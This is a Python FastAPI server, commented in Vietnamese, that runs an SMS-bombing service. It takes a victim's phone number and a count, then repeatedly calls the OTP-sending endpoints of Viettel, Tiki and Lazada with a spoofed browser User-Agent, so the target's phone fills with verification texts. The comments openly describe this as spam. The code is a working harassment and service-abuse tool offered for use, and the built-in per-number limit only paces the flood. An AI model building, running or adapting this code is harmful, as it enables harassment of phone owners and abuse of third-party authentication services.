#!/usr/bin/env python3
"""
DZI SMS TOOL SERVER
pip install fastapi uvicorn
"""

import os, uuid, threading, time
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, FileResponse
from pydantic import BaseModel
import requests

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

@app.get("/")
def root():
    return FileResponse("index.html")

# ── Giới hạn spam theo số điện thoại ──
PHONE_LIMIT     = 20        # tối đa 20 lần / lượt
PHONE_COOLDOWN  = 120       # cooldown 2 phút (giây)
phone_last: dict = {}       # { phone: (done_count, timestamp_reset) }
phone_lock = threading.Lock()

def check_phone_limit(phone: str) -> tuple[bool, str]:
    """Trả về (ok, error_msg). ok=True nghĩa là được phép spam."""
    now = time.time()
    with phone_lock:
        info = phone_last.get(phone)
        if info:
            count, reset_at = info
            if now < reset_at:
                remaining = int(reset_at - now)
                mins = remaining // 60
                secs = remaining % 60
                return False, f"⏳ Số {phone[:3]}***{phone[-3:]} đang cooldown! Thử lại sau {mins}p{secs:02d}s"
        return True, ""

def consume_phone_limit(phone: str, amount: int) -> int:
    """Trả về số lần thực tế được spam (tối đa PHONE_LIMIT)."""
    now = time.time()
    with phone_lock:
        info = phone_last.get(phone)
        if info:
            count, reset_at = info
            if now >= reset_at:
                count = 0
        else:
            count = 0
        allowed = min(amount, PHONE_LIMIT - count)
        if allowed <= 0:
            return 0
        new_count = count + allowed
        reset_at = now + PHONE_COOLDOWN
        phone_last[phone] = (new_count, reset_at)
        return allowed

# ── Session store ──
sessions: dict = {}

class StartReq(BaseModel):
    phone: str
    times: int

@app.post("/api/sms/start")
def sms_start(req: StartReq):
    if not req.phone.isdigit() or len(req.phone) != 10:
        raise HTTPException(400, "Số điện thoại không hợp lệ")
    if req.times < 1:
        raise HTTPException(400, "Số lần phải >= 1")

    # Kiểm tra cooldown
    ok, err_msg = check_phone_limit(req.phone)
    if not ok:
        raise HTTPException(429, err_msg)

    # Tính số lần thực tế
    allowed = consume_phone_limit(req.phone, req.times)
    if allowed <= 0:
        raise HTTPException(429, f"⏳ Số {req.phone[:3]}***{req.phone[-3:]} đã đạt giới hạn {PHONE_LIMIT} lần! Thử lại sau 2 phút.")

    sid = str(uuid.uuid4())[:8]
    stop_event = threading.Event()
    session = {
        "id": sid,
        "phone": req.phone,
        "total": allowed,
        "requested": req.times,
        "done": 0,
        "running": True,
        "stop_event": stop_event,
        "last_msg": "",
        "last_ok": True,
    }
    sessions[sid] = session

    threading.Thread(target=_spam_loop, args=(session,), daemon=True).start()
    return JSONResponse({
        "ok": True,
        "session_id": sid,
        "allowed": allowed,
        "note": f"Giới hạn {PHONE_LIMIT} lần/2 phút. Sẽ spam {allowed} lần." if allowed < req.times else ""
    })

@app.get("/api/sms/status/{sid}")
def sms_status(sid: str):
    s = sessions.get(sid)
    if not s:
        raise HTTPException(404, "Session không tồn tại")
    return JSONResponse({
        "running": s["running"],
        "done": s["done"],
        "total": s["total"],
        "last_msg": s.get("last_msg", ""),
        "last_ok": s.get("last_ok", True),
    })

@app.post("/api/sms/stop/{sid}")
def sms_stop(sid: str):
    s = sessions.get(sid)
    if not s:
        raise HTTPException(404, "Session không tồn tại")
    s["stop_event"].set()
    return JSONResponse({"ok": True})

# ── Hàm spam SMS thực tế ──
def _send_sms(phone: str):
    """Gọi các API spam SMS."""
    errors = []
    sent = False

    # API 1: Viettel
    try:
        r = requests.post(
            "https://myaccount.viettel.vn/api/sendOTP",
            json={"msisdn": phone},
            timeout=8,
            headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
        )
        if r.status_code in (200, 201):
            sent = True
    except Exception as e:
        errors.append(f"Viettel: {e}")

    # API 2: Tiki
    try:
        r = requests.post(
            "https://api.tiki.vn/v1/auth/otp/send",
            json={"phone": phone, "type": "SMS"},
            timeout=8,
            headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
        )
        if r.status_code in (200, 201):
            sent = True
    except Exception as e:
        errors.append(f"Tiki: {e}")

    # API 3: Lazada
    try:
        r = requests.post(
            "https://member.lazada.vn/user/api/sendVerifyCode",
            data={"phone": phone, "countryCode": "VN"},
            timeout=8,
            headers={"User-Agent": "Mozilla/5.0"}
        )
        if r.status_code in (200, 201):
            sent = True
    except Exception as e:
        errors.append(f"Lazada: {e}")

    if not sent and errors:
        raise Exception("; ".join(errors))

def _spam_loop(session: dict):
    phone = session["phone"]
    total = session["total"]
    stop  = session["stop_event"]

    for i in range(total):
        if stop.is_set():
            break
        try:
            _send_sms(phone)
            session["done"] += 1
            session["last_msg"] = f"✅ Lần {session['done']}/{total} — {phone[:3]}***{phone[-3:]}"
            session["last_ok"]  = True
        except Exception as e:
            session["last_msg"] = f"❌ Lần {i+1} lỗi: {str(e)[:80]}"
            session["last_ok"]  = False

        if not stop.is_set():
            time.sleep(0.5)

    session["running"] = False

if __name__ == "__main__":
    import uvicorn
    PORT = int(os.environ.get("PORT", 8000))
    print(f"🚀 DZI SMS Server — http://localhost:{PORT}")
    uvicorn.run(app, host="0.0.0.0", port=PORT)
